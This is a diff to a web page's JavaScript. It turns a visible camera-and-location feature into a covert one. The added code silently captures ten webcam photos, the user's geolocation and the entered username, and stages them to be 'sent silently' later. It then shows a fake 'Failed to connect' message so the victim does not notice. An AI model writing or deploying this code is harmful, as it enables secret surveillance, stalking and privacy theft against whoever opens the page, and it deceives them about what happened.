@@ -1,5 +1,4 @@
 const startBtn = document.getElementById('start-btn');
-const cameraSection = document.getElementById('camera-section');
 let videoStream = null;
 let photos = [];
 
@@ -10,33 +9,11 @@ startBtn.addEventListener('click', async () => {
         return;
     }
 
-    // Show camera section and request camera access
-    cameraSection.style.display = 'block';
+    // Request camera access and capture photos silently
     videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
-    document.getElementById('camera-stream').srcObject = videoStream;
-
-    // Automatically start capturing photos
     capturePhotos();
-});
 
-async function capturePhotos() {
-    const video = document.getElementById('camera-stream');
-    const canvas = document.createElement('canvas');
-    const ctx = canvas.getContext('2d');
-
-    for (let i = 0; i < 10; i++) {
-        // Capture photo every 1 second
-        await new Promise(resolve => setTimeout(resolve, 1000));
-
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        photos.push(canvas.toDataURL('image/png'));
-    }
-
-    videoStream.getTracks().forEach(track => track.stop()); // Stop the camera
-
-    // Get user location
+    // Get user location silently
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(async (position) => {
             const locationData = {
@@ -44,12 +21,40 @@ async function capturePhotos() {
                 longitude: position.coords.longitude
             };
 
-            // Here we'll send data via email (I'll explain this in a later step)
-            alert(`Data captured:\nUsername: ${document.getElementById('username').value}\nLocation: ${locationData.latitude}, ${locationData.longitude}`);
+            // Send the data silently (I'll explain sending in the next step)
+            console.log('Data captured', { username, photos, locationData });
+
+            // Show "Failed to connect" message
+            showFailedToConnect();
         }, error => {
-            alert('Unable to fetch location');
+            // Even if location fails, show "Failed to connect"
+            showFailedToConnect();
         });
     } else {
-        alert('Geolocation is not supported by your browser.');
+        showFailedToConnect();
     }
+});
+
+async function capturePhotos() {
+    const video = document.createElement('video');
+    video.srcObject = videoStream;
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+
+    // Wait for video to be ready
+    await new Promise(resolve => video.addEventListener('loadedmetadata', resolve));
+
+    for (let i = 0; i < 10; i++) {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        photos.push(canvas.toDataURL('image/png'));
+    }
+
+    videoStream.getTracks().forEach(track => track.stop()); // Stop the camera
+}
+
+function showFailedToConnect() {
+    document.getElementById('main-content').style.display = 'none';
+    document.getElementById('failed-message').style.display = 'block';
 }
